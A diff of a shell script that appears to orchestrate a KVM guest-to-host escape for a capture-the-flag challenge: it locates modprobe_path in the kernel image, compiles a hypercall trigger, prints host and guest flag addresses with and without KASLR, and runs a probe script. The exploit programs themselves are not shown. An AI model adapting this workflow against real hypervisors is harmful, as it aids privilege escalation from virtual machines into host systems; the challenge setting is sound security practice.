@@ -102,25 +102,6 @@ cd /root
 echo "fetching host modprobe path..."
 nm ./vmlinux | grep modprobe_path
 
-# FLAG ADDRESSES:
-
-Write flag address:     
-Read flag address:      
-
-on the guest system 
-
-ffffffff826279a8 = 
-ffffffff82b5ee10 = 
-sleep 2
-echo "host Addresses to scan WITH KASLR
-Write flag VA: ffffffff826279a8
-Phys: 0x64279a8
-Read flag VA: ffffffff82b5ee10
-Phys: 0x695ee10
-write without kaslr: 0x026279a8
-read without kaslr: 0x02b5ee10"
-
-
 sleep 2
 echo "compiling hypercall..."
 gcc -static -O2 -o trigger_hypercall_100 trigger_hypercall_100.c
@@ -236,6 +217,26 @@ echo "triggering the exploit now"
 # Trigger the exploit
 echo "/bin/bash -c "echo Triggering exploit""
 /bin/bash -c "echo Triggering exploit"
+
+sleep 2
+echo "host Addresses to scan WITH KASLR
+sleep 2
+Write flag host VA: 0xffffffff826279a8
+sleep 2
+Phys host: 0x64279a8
+sleep 2
+Read flag host VA: 0xffffffff82b5ee10
+sleep 2
+Phys host: 0x695ee10
+sleep 2
+Write flag guest VA: 0xffffffff826279a8
+sleep 2
+write flag guest: 0x026279a8
+sleep 2
+Read flag guest VA: 0xffffffff82b5ee10
+sleep 2
+read flag guest: 0x02b5ee10"
+sleep 10
 
 echo "running next exploit"
 python3 kvm_probe.py
